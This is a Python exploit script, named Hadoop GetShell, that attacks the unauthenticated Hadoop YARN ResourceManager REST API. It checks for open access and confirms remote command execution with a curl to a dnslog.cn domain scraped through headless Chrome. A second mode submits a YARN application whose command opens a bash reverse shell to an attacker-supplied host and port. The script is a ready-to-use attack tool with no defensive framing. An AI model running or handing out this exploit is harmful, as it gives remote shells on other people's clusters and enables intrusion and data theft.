import argparse
import sys
import requests
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

payload1 = "/ws/v1/cluster/apps/new-application"
payload2 = "/ws/v1/cluster/apps"
platform = "http://dnslog.cn/"

chrome_options = Options()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--disable-gpu')
chrome_options.add_argument('log-level=3')

path = r'C:\Program Files\Google\Chrome\Application\chrome.exe'
chrome_options.binary_location = path


def get_appid(target):
    url = target + payload1
    try:
        app_id = requests.post(url).json()['application-id']
        return app_id
    except Exception:
        return 1


def unauthorized_scan(target):
    try:
        status = requests.get(target + "/cluster").status_code
        if status == 200:
            return 1
    except Exception:
        return 0


def validation(target):
    app_id = get_appid(target)
    if app_id != 1:
        browser = webdriver.Chrome(options=chrome_options)
        browser.get(platform)
        browser.find_element(By.XPATH, '//div/button[1]').click()  # 找到获取域名按钮并点击
        time.sleep(1)
        myDomain = browser.find_element(By.ID, "myDomain").text  # 域名地址
        print("[*] Get Domain {}".format(myDomain))
        url = target + payload2
        data = {
            'application-id': app_id,
            'application-name': 'itHUwh6duDtTBZJ',
            'am-container-spec': {
                'commands': {
                    'command': 'curl %s' % myDomain,
                },
            },
            'application-type': 'YARN',
        }
        requests.post(url, json=data)
        time.sleep(3)
        browser.find_element(By.XPATH, '//div/button[2]').click()  # 找到刷新按钮并点击
        time.sleep(3)  # 根据dnslog平台延迟 自行修改
        try:
            DNS = browser.find_element(By.XPATH, '//table/tbody/tr/td[1]').text
            ip = browser.find_element(By.XPATH, '//table/tbody/tr/td[2]').text
            Time = browser.find_element(By.XPATH, '//table/tbody/tr/td[3]').text
            print("INFO:", DNS, ip, Time)
            print("[!] %s Hadoop RCE vulnerability exists" % target)
            browser.close()
        except Exception:
            print("[*] %s Hadoop RCE Vulnerability does not exis" % target)
            browser.close()
    else:
        print("[*] %s Hadoop RCE Vulnerability does not exis" % target)
        sys.exit()


def rebound(target, address):
    addr = address.split(":")
    vps = addr[0]
    port = addr[1]
    app_id = get_appid(target)
    url = target + payload2
    data = {
        'application-id': app_id,
        'application-name': 'itHUwh6duDtTBZJ',
        'am-container-spec': {
            'commands': {
                'command': '/bin/bash -i >& /dev/tcp/%s/%s 0>&1' % (vps, port),
            },
        },
        'application-type': 'YARN',
    }
    requests.post(url, json=data)
    print("Check the VPS NC listening status!")


def cmd():
    parser = argparse.ArgumentParser(usage="python Hadoop.py -t http://target.com",
                                     description="Hadoop GetShell [Zoomeye:app:Hadoop YARN]")
    parser.add_argument("-t", "--target", help="attack target", type=str)
    parser.add_argument("-a", "--address", help="Remote VPS listening address(127.0.0.1:9999)", type=str, default="")
    args = parser.parse_args()
    return args


if __name__ == '__main__':
    if len(sys.argv) == 1:
        print("Usage: python Hadoop.py -h")
        sys.exit()
    args = cmd()
    target = args.target
    address = args.address

    t = target[-1]
    if t != "/":
        if target != "" and address == "":
            code = unauthorized_scan(target)
            if code == 1:
                validation(target)
            else:
                print("[*] %s Hadoop unauthorized vulnerability does not exist" % target)
        if target != "" and address != "":
            rebound(target, address)
    else:
        print("Usage: python Hadoop.py -t http://target.com")
